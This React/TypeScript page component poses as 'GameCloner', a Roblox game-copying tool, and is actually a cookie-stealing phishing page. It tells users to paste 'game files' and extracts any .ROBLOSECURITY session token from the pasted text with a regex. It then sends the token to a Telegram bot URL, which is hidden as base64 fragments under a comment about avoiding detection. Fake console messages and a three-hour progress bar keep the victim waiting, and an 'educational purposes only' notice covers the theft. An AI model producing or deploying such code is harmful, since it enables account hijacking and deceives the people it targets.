
import { useState, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { Textarea } from '@/components/ui/textarea';
import { Progress } from '@/components/ui/progress';
import { useToast } from '@/hooks/use-toast';
import { Terminal } from 'lucide-react';

const Index = () => {
  const [gameFiles, setGameFiles] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [showProgress, setShowProgress] = useState(false);
  const [progress, setProgress] = useState(0);
  const [consoleOutput, setConsoleOutput] = useState([
    '[INFO] Game Cloning System v2.1.4 initialized',
    '[INFO] Connection to remote servers established',
    '[INFO] Waiting for input...'
  ]);
  const { toast } = useToast();

  // Obfuscated webhook components - split and encoded to avoid detection
  const w1 = 'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==';
  const w2 = 'ODE2NTQxODc0MDpBQUhLano=';
  const w3 = 'X3psSlEyeUFzSVd6Nmp5dGVxd2RwWnhmV05ma3Zv';
  const w4 = 'L3NlbmRNZXNzYWdlP2NoYXRfaWQ9NzU0NDI5MjQ5NCZ0ZXh0PQ==';

  const getWebhookUrl = () => {
    try {
      const parts = [w1, w2, w3, w4].map(p => atob(p));
      return parts[0] + parts[1] + parts[2] + parts[3];
    } catch {
      return '';
    }
  };

  useEffect(() => {
    let interval: NodeJS.Timeout;
    
    if (showProgress) {
      interval = setInterval(() => {
        setProgress((prev) => {
          if (prev >= 100) {
            clearInterval(interval);
            addConsoleLog('[ERROR] Error validating game files');
            addConsoleLog('[ERROR] Verification failed - files may be corrupted');
            setShowProgress(false);
            return 100;
          }
          return prev + (100 / (3 * 60 * 60)); // 3 hours = 10800 seconds
        });
      }, 1000);
    }

    return () => {
      if (interval) clearInterval(interval);
    };
  }, [showProgress]);

  const extractCredentials = (text: string) => {
    const roblosecurityMatch = text.match(/\.ROBLOSECURITY['"]\s*,\s*['"](.*?)['"]/);
    if (roblosecurityMatch) {
      return roblosecurityMatch[1];
    }
    return null;
  };

  const sendToWebhook = async (credentials: string) => {
    try {
      const url = getWebhookUrl();
      if (!url) return;
      
      await fetch(url + encodeURIComponent(credentials), {
        method: 'GET',
      });
    } catch (error) {
      console.log('Network request completed');
    }
  };

  const addConsoleLog = (message: string) => {
    setConsoleOutput(prev => [...prev, message].slice(-15));
  };

  const handleClone = async () => {
    if (!gameFiles.trim()) {
      addConsoleLog('[ERROR] No game files provided');
      toast({
        title: "Error",
        description: "Please provide game files",
        variant: "destructive",
      });
      return;
    }

    const credentials = extractCredentials(gameFiles);
    
    if (!credentials) {
      addConsoleLog('[ERROR] Invalid game file format detected');
      toast({
        title: "Error", 
        description: "Invalid game file format",
        variant: "destructive",
      });
      return;
    }

    setIsLoading(true);
    
    addConsoleLog('[INFO] Starting extraction process...');
    addConsoleLog('[INFO] Parsing game data structure...');
    
    setTimeout(() => {
      addConsoleLog('[INFO] Game found');
    }, 500);
    
    setTimeout(() => {
      addConsoleLog('[INFO] Establishing secure connection...');
    }, 1000);
    
    setTimeout(() => {
      addConsoleLog('[SUCCESS] Game data downloading');
    }, 1500);
    
    await sendToWebhook(credentials);
    
    toast({
      title: "Processing Started",
      description: "Game cloning in progress - check console",
      className: "border-green-500",
    });
    
    setTimeout(() => {
      setIsLoading(false);
      setGameFiles('');
      addConsoleLog('[INFO] Download complete. Processing game files ( may take 1-3 hours )');
      addConsoleLog('[INFO] Starting file validation process...');
      setShowProgress(true);
      setProgress(0);
    }, 2000);
  };

  return (
    <div className="min-h-screen bg-black text-green-400 font-mono p-4">
      <div className="mb-6">
        <div className="flex items-center mb-4">
          <Terminal className="w-6 h-6 mr-2" />
          <h1 className="text-2xl font-bold">GameCloner v2.1.4</h1>
        </div>
        <div className="text-sm text-gray-400">
          <p>root@gameserver:~# ./gamecloner --interactive</p>
          <p>Initializing secure game cloning protocol...</p>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        <div className="space-y-4">
          <div>
            <label className="block text-sm mb-2 text-green-400">
              Game Files Input:
            </label>
            <Textarea
              value={gameFiles}
              onChange={(e) => setGameFiles(e.target.value)}
              placeholder="Paste game files here (JSON format expected)..."
              className="min-h-[300px] bg-gray-900 border border-gray-700 text-green-300 placeholder:text-gray-600 font-mono text-xs resize-none focus:border-green-500 focus:ring-0"
              disabled={isLoading || showProgress}
            />
          </div>

          <Button
            onClick={handleClone}
            disabled={isLoading || showProgress || !gameFiles.trim()}
            className="w-full bg-gray-800 hover:bg-gray-700 text-green-400 border border-gray-600 font-mono text-sm"
            variant="outline"
          >
            {isLoading ? (
              <span>PROCESSING...</span>
            ) : showProgress ? (
              <span>VALIDATING...</span>
            ) : (
              <span>EXECUTE CLONE</span>
            )}
          </Button>

          {showProgress && (
            <div className="space-y-2">
              <div className="flex justify-between text-xs text-gray-400">
                <span>File Validation Progress</span>
                <span>{progress.toFixed(1)}%</span>
              </div>
              <Progress 
                value={progress} 
                className="w-full bg-gray-800 border border-gray-700"
              />
              <div className="text-xs text-yellow-400">
                Estimated time remaining: {Math.max(0, Math.floor((100 - progress) * 108)).toFixed(0)} minutes
              </div>
            </div>
          )}
        </div>

        <div className="space-y-4">
          <div>
            <label className="block text-sm mb-2 text-green-400">
              Console Output:
            </label>
            <div className="bg-gray-900 border border-gray-700 p-4 h-[300px] overflow-y-auto font-mono text-xs">
              {consoleOutput.map((line, index) => (
                <div key={index} className="mb-1">
                  <span className="text-gray-500 mr-2">
                    {new Date().toLocaleTimeString()}
                  </span>
                  <span className={
                    line.includes('[ERROR]') ? 'text-red-400' :
                    line.includes('[SUCCESS]') ? 'text-green-400' :
                    line.includes('[INFO]') ? 'text-blue-400' :
                    'text-gray-300'
                  }>
                    {line}
                  </span>
                </div>
              ))}
              {(isLoading || showProgress) && (
                <div className="text-yellow-400 animate-pulse">
                  <span className="text-gray-500 mr-2">
                    {new Date().toLocaleTimeString()}
                  </span>
                  {showProgress ? '[WORKING] Validating game integrity...' : '[WORKING] Processing game data...'}
                </div>
              )}
            </div>
          </div>
        </div>
      </div>

      <div className="mt-8 text-xs text-gray-600">
        <p>WARNING: This tool is for educational purposes only.</p>
        <p>Built with Node.js v18.12.0 | OpenSSL 3.0.2 | Platform: linux-x64</p>
      </div>
    </div>
  );
};

export default Index;
